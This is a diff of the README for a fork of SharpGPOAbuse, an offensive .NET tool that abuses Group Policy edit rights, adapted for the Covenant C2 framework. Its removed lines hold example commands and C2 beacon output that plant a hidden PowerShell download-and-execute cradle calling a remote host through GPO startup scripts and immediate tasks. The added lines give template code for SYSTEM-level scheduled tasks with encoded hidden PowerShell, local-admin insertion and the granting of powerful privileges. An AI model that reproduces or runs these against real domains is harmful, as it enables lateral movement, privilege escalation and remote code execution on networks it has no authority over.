@@ -1,118 +1,85 @@
 # SharpGPOAbuse
 SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.
 
-More details can be found at the following blog post: [https://labs.mwrinfosecurity.com/tools/sharpgpoabuse](https://labs.mwrinfosecurity.com/tools/sharpgpoabuse)
+More details can be found at the following blog post: [https://labs.f-secure.com/tools/sharpgpoabuse](https://labs.f-secure.com/tools/sharpgpoabuse)
+
+This fork provides some modifications for use with Covenant's Grunts.  The most notable changes are removing the `Environment.Exit()` calls that will kill a Grunt (since they do not create sacrificial processes for post-ex jobs); removing the dependency for CommandLineParser, and modifying `Main()` to hardcode an attack type and associated options.
 
 ## Compile Instructions ## 
-SharpGPOAbuse has been built against .NET 3.5 and is compatible with Visual Studio 2017. Simply open the solution file and build the project.
-
-CommandLineParser has been used in order to parse the command line arguments. This package will need to be installed by issuing the following command into the NuGet Package Manager Console:
-
-`Install-Package CommandLineParser -Version 1.9.3.15`
-
-After compiling the project, merge the SharpGPOAbuse.exe and the CommandLine.dll into one executable file using ILMerge:
-
-`ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll`
+SharpGPOAbuse has been built against .NET 3.5 and is compatible with Visual Studio 2017 & 2019. Simply open the solution file and build the project.
 
 ## Usage ##
-```
-Usage:
-        SharpGPOAbuse.exe <AttackType> <AttackOptions>
-```
+Modify line `36` to define the attack type.
+e.g. `StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");`
+
+Modify the `const` strings (line `11` and onwards) to define the necessary options for the chosen attack type.
 
 ## Attacks Types ## 
 Currently SharpGPOAbuse supports the following options:
 
 | Option               | Description                               |
 | ---------------------|-------------------------------------------|
-| [--AddUserRights](#adding-user-rights) | Add rights to a user                      |
-| [--AddLocalAdmin](#adding-a-local-admin)      | Add a user to the local admins group      |
-| [--AddComputerScript](#configuring-a-user-or-computer-logon-script)  | Add a new computer startup script         |
-| [--AddUserScript](#configuring-a-user-or-computer-logon-script)      | Configure a user logon script             |
-| [--AddComputerTask](#configuring-a-computer-or-user-immediate-task)    | Configure a computer immediate task       |
-| [--AddUserTask](#configuring-a-computer-or-user-immediate-task)        | Add an immediate task to a user           |
+| [AddUserRights](#adding-user-rights) | Add rights to a user                      |
+| [AddLocalAdmin](#adding-a-local-admin)      | Add a user to the local admins group      |
+| [AddComputerScript](#configuring-a-user-or-computer-logon-script)  | Add a new computer startup script         |
+| [AddUserScript](#configuring-a-user-or-computer-logon-script)      | Configure a user logon script             |
+| [AddComputerTask](#configuring-a-computer-or-user-immediate-task)    | Configure a computer immediate task       |
+| [AddUserTask](#configuring-a-computer-or-user-immediate-task)        | Add an immediate task to a user           |
 
 ## Attack Options
 
 ### Adding User Rights 
 ```
-Options required to add new user rights:
---UserRights
-        Set the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.
---UserAccount
-        Set the account to add the new rights.
---GPOName
-        The name of the vulnerable GPO.
-        
-Example:
-        SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
+string[] UserRights = { "", "" };
+string UserAccount = "";
+string GPOName = "";
+
+UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
+```
+
+`UserRights` can be any of the following:
+
+```
+SeTrustedCredManAccessPrivilege, SeNetworkLogonRight, SeTcbPrivilege, SeMachineAccountPrivilege, SeIncreaseQuotaPrivilege, SeInteractiveLogonRight, SeRemoteInteractiveLogonRight, SeBackupPrivilege, SeChangeNotifyPrivilege, SeSystemtimePrivilege, SeTimeZonePrivilege, SeCreatePagefilePrivilege, SeCreateTokenPrivilege, SeCreateGlobalPrivilege, SeCreatePermanentPrivilege, SeCreateSymbolicLinkPrivilege, SeDebugPrivilege, SeDenyNetworkLogonRight, SeDenyBatchLogonRight, SeDenyServiceLogonRight, SeDenyInteractiveLogonRight, SeDenyRemoteInteractiveLogonRight, SeEnableDelegationPrivilege, SeRemoteShutdownPrivilege, SeAuditPrivilege, SeImpersonatePrivilege, SeIncreaseWorkingSetPrivilege, SeIncreaseBasePriorityPrivilege, SeLoadDriverPrivilege, SeLockMemoryPrivilege, SeBatchLogonRight, SeServiceLogonRight, SeSecurityPrivilege, SeRelabelPrivilege, SeSystemEnvironmentPrivilege, SeManageVolumePrivilege, SeProfileSingleProcessPrivilege, SeSystemProfilePrivilege, SeUndockPrivilege, SeAssignPrimaryTokenPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeSyncAgentPrivilege, SeTakeOwnershipPrivilege
 ```
 
 ### Adding a Local Admin 
 ```
-Options required to add a new local admin:
---UserAccount
-        Set the name of the account to be added in local admins.
---GPOName
-        The name of the vulnerable GPO.
+string UserAccount = "";
+string GPOName = "";
 
-Example:
-        SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
+LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
 ```
 
 ### Configuring a User or Computer Logon Script  
 ```
-Options required to add a new user or computer startup script:
---ScriptName
-        Set the name of the new startup script.
---ScriptContents
-        Set the contents of the new startup script.
---GPOName
-        The name of the vulnerable GPO.
+string ScriptName = "";
+string ScriptContent = "";
+string GPOName = "";
 
-Example: 
-        SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
 ```
 
 ### Configuring a Computer or User Immediate Task  
 ```
-Options required to add a new computer or user immediate task:
---TaskName
-        Set the name of the new computer task.
---Author
-        Set the author of the new task (use a DA account).
---Command
-        Command to execute.
---Arguments
-        Arguments passed to the command.
---GPOName
-        The name of the vulnerable GPO.
+string TaskName = "";
+string Author = "NT AUTHORITY\\SYSTEM";
+string Command = "powershell.exe";
+string Arguments = "-Sta -Nop -Window Hidden -EncodedCommand <>";
+string GPOName = "";
 
-Example: 
-        SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
 ```
-
-## Additional Options 
-| Option               | Description                               |
-| ---------------------|-------------------------------------------|
-| --DomainController   | Set the target domain controller          |
-| --Domain             | Set the target domain                     |
-| --Force              | Overwrite existing files if required      | 
 
 ## Example Output
 ```
-beacon> execute-assembly /root/Desktop/SharpGPOAbuse_final.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
-[*] Tasked beacon to run .NET program: SharpGPOAbuse_final.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"I
-EX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
-[+] host called home, sent: 171553 bytes
-[+] received output:
-[+] Domain = europa.com
-[+] Domain Controller = EURODC01.europa.com
-[+] Distinguished Name = CN=Policies,CN=System,DC=europa,DC=com
-[+] GUID of "Default Server Policy" is: {877CB769-3543-40C6-A757-F2DF4E5E28BD}
-[+] Creating file \\europa.com\SysVol\europa.com\Policies\{877CB769-3543-40C6-A757-F2DF4E5E28BD}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] Domain = prod.zeropointsecurity.local
+[+] Domain Controller = tf-win-dc02.prod.zeropointsecurity.local
+[+] Distinguished Name = CN=Policies,CN=System,DC=prod,DC=zeropointsecurity,DC=local
+[+] GUID of Server Baseline is: {205F0E03-17C3-4E9B-925E-330FAD565CA1}
+[+] Creating new startup script...
 [+] versionNumber attribute changed successfully
 [+] The version number in GPT.ini was increased successfully.
-[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.
 [+] Done!
 ```
